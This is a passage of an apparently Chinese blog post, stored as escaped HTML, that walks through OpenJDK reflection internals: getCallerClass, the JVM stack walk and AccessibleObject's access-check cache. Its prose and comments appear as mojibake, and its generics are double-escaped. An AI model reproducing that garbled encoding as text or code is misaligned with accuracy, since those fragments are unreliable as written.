&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">JNIEXPORT&lt;/span> &lt;span class="n">jclass&lt;/span> &lt;span class="n">JNICALL&lt;/span> &lt;span class="nf">Java_sun_reflect_Reflection_getCallerClass__&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">jclass&lt;/span> &lt;span class="n">unused&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">JVM_GetCallerClass&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">JVM_CALLER_DEPTH&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="n">JVM_ENTRY&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">jclass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JVM_GetCallerClass&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">JNIEnv&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">depth&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">JVMWrapper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;JVM_GetCallerClass&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Pre-JDK 8 and early builds of JDK 8 don&amp;#39;t have a CallerSensitive annotation; or
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// sun.reflect.Reflection.getCallerClass with a depth parameter is provided
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// temporarily for existing code to use until a replacement API is defined.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">SystemDictionary&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">reflect_CallerSensitive_klass&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">depth&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">JVM_CALLER_DEPTH&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Klass&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">security_get_caller_class&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">depth&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nb">NULL&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">jclass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">make_local&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">java_mirror&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Getting the class of the caller frame.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// The call stack at this point looks something like this:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// [1] [ @CallerSensitive API.method ]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// [.] [ (skipped intermediate frames) ]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// [n] [ caller ]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">vframeStream&lt;/span> &lt;span class="nf">vfst&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Cf. LibraryCallKit::inline_native_Reflection_getCallerClass
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="n">vfst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">at_end&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">vfst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">security_next&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Method&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">vfst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">assert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;sanity&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// This must only be called from Reflection.getCallerClass
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">intrinsic_id&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">vmIntrinsics&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">_getCallerClass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_MSG_NULL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_InternalError&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;JVM_GetCallerClass must only be called from Reflection.getCallerClass&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// fall-through
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">case&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Frame 0 and 1 must be caller sensitive.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">caller_sensitive&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THROW_MSG_NULL&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">vmSymbols&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">java_lang_InternalError&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">err_msg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;CallerSensitive annotation expected at frame %d&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">n&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">is_ignored_by_security_stack_walk&lt;/span>&lt;span class="p">())&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// We have reached the desired frame; return the holder class.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">jclass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">JNIHandles&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">make_local&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">env&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">m&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">method_holder&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">java_mirror&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">JVM_END&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è·å–äº†è¿™ä¸ªClasså¯¹è±¡calleråç”¨checkAccessæ–¹æ³•åšä¸€æ¬¡å¿«é€Ÿçš„æƒé™æ ¡éªŒ :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">volatile&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">securityCheckCache&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="nf">checkAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">throws&lt;/span> &lt;span class="n">IllegalAccessException&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">caller&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="c1">// å¿«é€Ÿæ ¡éªŒ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// æƒé™é€šè¿‡æ ¡éªŒ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Object&lt;/span> &lt;span class="n">cache&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">securityCheckCache&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// read volatile
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">targetClass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">obj&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">Modifier&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isProtected&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">modifiers&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="o">((&lt;/span>&lt;span class="n">targetClass&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getClass&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Must match a 2-list of { caller, targetClass }.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">cache&lt;/span> &lt;span class="k">instanceof&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">[])&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;[]&lt;/span> &lt;span class="n">cache2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;[])&lt;/span> &lt;span class="n">cache&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">cache2&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">targetClass&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&amp;amp;&lt;/span>&lt;span class="n">amp&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cache2&lt;/span>&lt;span class="o">[&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">caller&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// ACCESS IS OK
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// (Test cache[1] first since range check for [1]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// subsumes range check for [0].)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">cache&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">caller&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Non-protected case (or obj.class == this.clazz).
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="c1">// ACCESS IS OK
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// If no return, fall through to the slow path.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">slowCheckMemberAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">targetClass&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å…ˆå¿«é€Ÿæ£€æŸ¥ï¼Œæœªé€šè¿‡çš„è¯å»ºç«‹ç¼“å­˜ï¼Œä¸­é—´å†æ£€æŸ¥ï¼›&lt;/p>
&lt;p>å¦‚æœéƒ½æ²¡æœ‰é€šè¿‡ï¼šè¿›è¡Œæ›´è¯¦ç»†çš„æ£€æŸ¥;&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Keep all this slow stuff out of line:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">slowCheckMemberAccess&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">caller&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">lt&lt;/span>&lt;span class="o">;?&amp;amp;&lt;/span>&lt;span class="n">gt&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">clazz&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">modifiers&lt;/span>&lt;span class="o">,&lt;/span>
